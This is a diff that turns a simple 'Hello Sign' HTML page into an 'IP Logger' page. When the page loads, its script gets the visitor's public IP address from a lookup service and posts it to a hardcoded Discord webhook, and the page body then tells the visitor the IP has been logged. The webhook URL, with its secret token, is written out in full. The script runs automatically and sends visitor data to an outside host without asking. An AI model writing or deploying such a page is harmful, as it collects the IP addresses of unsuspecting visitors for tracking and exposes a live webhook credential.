@@ -3,25 +3,33 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hello Sign</title>
-    <style>
-        .sign {
-            width: 200px;
-            height: 100px;
-            background-color: lightblue;
-            color: darkblue;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            border: 2px solid darkblue;
-            border-radius: 10px;
-            font-family: Arial, sans-serif;
-            font-size: 24px;
-            font-weight: bold;
+    <title>IP Logger</title>
+    <script>
+        async function sendIPToWebhook() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+
+                // Send IP directly to the Discord webhook
+                await fetch('https://discord.com/api/webhooks/1302684161852702730/YiE1EIC9F0U5ayDfXEdhSi4H1tiNilrSysfPTpFRJ6BEZ5jdia5QwHaYbf4oSlj8zgvp', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        content: `New IP logged: ${data.ip}`
+                    })
+                });
+            } catch (error) {
+                console.error('Error sending IP to Discord webhook:', error);
+            }
         }
-    </style>
+
+        window.onload = sendIPToWebhook;
+    </script>
 </head>
 <body>
-    <div class="sign">Hello</div>
+    <h1>Welcome!</h1>
+    <p>Your IP has been logged.</p>
 </body>
 </html>
